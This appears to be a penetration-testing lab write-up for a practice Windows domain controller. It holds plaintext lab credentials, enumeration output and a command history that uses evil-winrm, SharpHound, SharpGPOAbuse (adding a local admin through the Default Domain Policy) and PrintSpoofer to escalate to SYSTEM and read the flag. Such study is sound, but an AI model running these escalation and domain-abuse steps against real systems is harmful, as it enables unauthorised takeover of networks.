# VM 3 192.168.x.97
# Summary
- Gained initial access using creds found in the mysql database on box .96
- WinRm using charlotte account
- SeImpersonatePrivilege Enabled
- Used PrintSpoofer.exe to elevate privileges.
- Used one liners and output PrintSpoofer commands to file
- Could have tried to create a new local admin user and add them to Win RM group but did not 
# Flag Location
`Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt`
- C:\Users\charlotte\Desktop\local.txt
- C:\Users\Administrator.DC01\Desktop\proof.txt
# Accounts
### charlotte       Game2On4.!
`evil-winrm -i 192.168.159.97 -u 'charlotte' -p 'Game2On4.!'`
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeMachineAccountPrivilege     Add workstations to domain                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```
```
GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```
# Enumeration
## NMAP
`sudo nmap -sV 192.168.141.97 --top-ports 1000`

```
PORT    STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-25 16:10:49Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: SECURA)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
## Local Users
`Get-LocalUser`
```
Name           Enabled Description
----           ------- -----------
Administrator  True    Built-in account for administering the computer/domain
Guest          False   Built-in account for guest access to the computer/domain
krbtgt         False   Key Distribution Center Service Account
DefaultAccount False   A user account managed by the system.
michael        True
charlotte      True
eric.wallows   True
DC01$          True
SECURE$        True
```
## Local Groups
`Get-LocalGroup`
```
Name                                    Description
----                                    -----------
Cert Publishers                         Members of this group are permitted to publish certificates to the directory
RAS and IAS Servers                     Servers in this group can access remote access properties of users
Allowed RODC Password Replication Group Members in this group can have their passwords replicated to all read-only domain controllers in the domain
Denied RODC Password Replication Group  Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
```
## System Info
`systeminfo`
```

```
## Routes
`route print`
```
===========================================================================
Interface List
  5...00 50 56 86 f2 ab ......vmxnet3 Ethernet Adapter
  1...........................Software Loopback Interface 1
  3...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0  192.168.159.254   192.168.159.97     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
    192.168.159.0    255.255.255.0         On-link    192.168.159.97    271
   192.168.159.97  255.255.255.255         On-link    192.168.159.97    271
  192.168.159.255  255.255.255.255         On-link    192.168.159.97    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link    192.168.159.97    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link    192.168.159.97    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0  192.168.159.254       1
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None
```
## Netstat
`netstat -ano`
```
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       604
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       832
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       604
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       604
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       832
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       604
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       604
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       604
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       1500
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       488
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       320
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       992
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       604
  TCP    0.0.0.0:49675          0.0.0.0:0              LISTENING       604
  TCP    0.0.0.0:49676          0.0.0.0:0              LISTENING       604
  TCP    0.0.0.0:49677          0.0.0.0:0              LISTENING       888
  TCP    0.0.0.0:49682          0.0.0.0:0              LISTENING       596
  TCP    0.0.0.0:49704          0.0.0.0:0              LISTENING       1588
  TCP    0.0.0.0:49707          0.0.0.0:0              LISTENING       2068
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2068
  TCP    127.0.0.1:389          127.0.0.1:49679        ESTABLISHED     604
  TCP    127.0.0.1:389          127.0.0.1:49681        ESTABLISHED     604
  TCP    127.0.0.1:389          127.0.0.1:49926        ESTABLISHED     604
  TCP    127.0.0.1:49679        127.0.0.1:389          ESTABLISHED     1084
  TCP    127.0.0.1:49681        127.0.0.1:389          ESTABLISHED     1084
  TCP    127.0.0.1:49926        127.0.0.1:389          ESTABLISHED     2068
  TCP    192.168.159.97:53      0.0.0.0:0              LISTENING       2068
  TCP    192.168.159.97:139     0.0.0.0:0              LISTENING       4
  TCP    192.168.159.97:389     192.168.159.97:49946   ESTABLISHED     604
  TCP    192.168.159.97:389     192.168.159.97:49990   ESTABLISHED     604
  TCP    192.168.159.97:389     192.168.159.97:49997   ESTABLISHED     604
  TCP    192.168.159.97:5985    192.168.45.219:33720   TIME_WAIT       0
  TCP    192.168.159.97:5985    192.168.45.219:33722   ESTABLISHED     4
  TCP    192.168.159.97:5985    192.168.45.219:38730   TIME_WAIT       0
  TCP    192.168.159.97:5985    192.168.45.219:40516   TIME_WAIT       0
  TCP    192.168.159.97:5985    192.168.45.219:41722   TIME_WAIT       0
  TCP    192.168.159.97:49946   192.168.159.97:389     ESTABLISHED     2068
  TCP    192.168.159.97:49990   192.168.159.97:389     ESTABLISHED     1588
  TCP    192.168.159.97:49997   192.168.159.97:389     ESTABLISHED     1588
  TCP    192.168.159.97:50529   13.89.179.14:443       TIME_WAIT       0
  TCP    [::]:88                [::]:0                 LISTENING       604
  TCP    [::]:135               [::]:0                 LISTENING       832
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       604
  TCP    [::]:593               [::]:0                 LISTENING       832
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:9389              [::]:0                 LISTENING       1500
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       488
  TCP    [::]:49665             [::]:0                 LISTENING       320
  TCP    [::]:49666             [::]:0                 LISTENING       992
  TCP    [::]:49667             [::]:0                 LISTENING       604
  TCP    [::]:49675             [::]:0                 LISTENING       604
  TCP    [::]:49676             [::]:0                 LISTENING       604
  TCP    [::]:49677             [::]:0                 LISTENING       888
  TCP    [::]:49682             [::]:0                 LISTENING       596
  TCP    [::]:49704             [::]:0                 LISTENING       1588
  TCP    [::]:49707             [::]:0                 LISTENING       2068
  TCP    [::1]:53               [::]:0                 LISTENING       2068
  TCP    [::1]:49676            [::1]:49694            ESTABLISHED     604
  TCP    [::1]:49676            [::1]:49712            ESTABLISHED     604
  TCP    [::1]:49676            [::1]:49797            ESTABLISHED     604
  TCP    [::1]:49676            [::1]:50539            ESTABLISHED     604
  TCP    [::1]:49694            [::1]:49676            ESTABLISHED     1588
  TCP    [::1]:49712            [::1]:49676            ESTABLISHED     2240
  TCP    [::1]:49797            [::1]:49676            ESTABLISHED     604
  TCP    [::1]:50524            [::1]:135              TIME_WAIT       0
  TCP    [::1]:50538            [::1]:135              TIME_WAIT       0
  TCP    [::1]:50539            [::1]:49676            ESTABLISHED     604
  UDP    0.0.0.0:123            *:*                                    328
  UDP    0.0.0.0:389            *:*                                    604
  UDP    0.0.0.0:5050           *:*                                    328
  UDP    0.0.0.0:5353           *:*                                    1048
  UDP    0.0.0.0:5355           *:*                                    1048
  UDP    0.0.0.0:52222          *:*                                    2068
  UDP    0.0.0.0:52223          *:*                                    2068
  ...
  UDP    0.0.0.0:63870          *:*                                    2068
  UDP    127.0.0.1:53           *:*                                    2068
  UDP    127.0.0.1:52218        *:*                                    1084
  UDP    127.0.0.1:56372        *:*                                    2068
  UDP    127.0.0.1:60465        *:*                                    1588
  UDP    127.0.0.1:60466        *:*                                    1500
  UDP    127.0.0.1:60507        *:*                                    1048
  UDP    127.0.0.1:62456        *:*                                    992
  UDP    127.0.0.1:63994        *:*                                    604
  UDP    192.168.159.97:53      *:*                                    2068
  UDP    192.168.159.97:88      *:*                                    604
  UDP    192.168.159.97:137     *:*                                    4
  UDP    192.168.159.97:138     *:*                                    4
  UDP    192.168.159.97:464     *:*                                    604
  UDP    [::]:123               *:*                                    328
  UDP    [::]:63871             *:*                                    2068
  UDP    [::1]:53               *:*                                    2068
  UDP    [::1]:52219            *:*                                    2068
```
## Environment Vars
`Get-ChildItem Env:`
```
Name                           Value
----                           -----
ALLUSERSPROFILE                C:\ProgramData
APPDATA                        C:\Users\TEMP\AppData\Roaming
CommonProgramFiles             C:\Program Files\Common Files
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
CommonProgramW6432             C:\Program Files\Common Files
COMPUTERNAME                   DC01
ComSpec                        C:\Windows\system32\cmd.exe
LOCALAPPDATA                   C:\Users\TEMP\AppData\Local
NUMBER_OF_PROCESSORS           2
OS                             Windows_NT
Path                           C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\TEMP\AppData\Local\Microsoft\WindowsApps
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE         AMD64
PROCESSOR_IDENTIFIER           AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
PROCESSOR_LEVEL                25
PROCESSOR_REVISION             0101
ProgramData                    C:\ProgramData
ProgramFiles                   C:\Program Files
ProgramFiles(x86)              C:\Program Files (x86)
ProgramW6432                   C:\Program Files
PSModulePath                   C:\Users\TEMP\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC                         C:\Users\Public
SystemDrive                    C:
SystemRoot                     C:\Windows
TEMP                           C:\Users\TEMP\AppData\Local\Temp
TMP                            C:\Users\TEMP\AppData\Local\Temp
USERDNSDOMAIN                  secura.yzx
USERDOMAIN                     SECURA
USERNAME                       charlotte
USERPROFILE                    C:\Users\TEMP
windir                         C:\Windows
```
## Domain Controller Info
`nltest /dsgetdc:secura`
```
         DC: \\DC01
      Address: \\192.168.159.97
     Dom Guid: 87c65b4a-0215-4b85-8e9a-800aca53a1c0
     Dom Name: SECURA
  Forest Name: secura.yzx
 Dc Site Name: Default-First-Site-Name
Our Site Name: Default-First-Site-Name
        Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10
```
# Services    


## Command History
```c
  // Found sharpgpoabuse.exe in c:\users\charlotte\Documents (ended up not using this)
  Get-GPO -All | Select DisplayName
      DisplayName
      -----------
      Default Domain Policy
      Default Domain Controllers Policy
  * possibly modifiable GPOs?
    *local
    wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
    *evil-winrm
    upload sharphound.exe to box
    sharphound.exe -c All
    download 20250425171056_BloodHound.zip
    *local
    sudo apt install bloodhound
    had to update password now login is: neo47 / kali
    bloodhound
    *opens bloodhound
    upload zip file
    -----
    // on target
    .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"
    *local
    wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
    upload SigmaPotato.exe
    * wouldnt work trying printspoofer instead
    upload PrintSpoofer64.exe
    .\PrintSpoofer64.exe -c "cmd.exe /c whoami > C:\Users\charlotte\Documents\whoami.txt"
    .\PrintSpoofer64.exe -c "powershell.exe /c Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt > C:\Users\charlotte\Documents\files.txt"
    // found C:\Users\Administrator.DC01\Desktop\proof.txt 
    .\PrintSpoofer64.exe -c "powershell.exe /c type C:\Users\Administrator.DC01\Desktop\proof.txt > C:\Users\charlotte\Documents\flag.txt"
```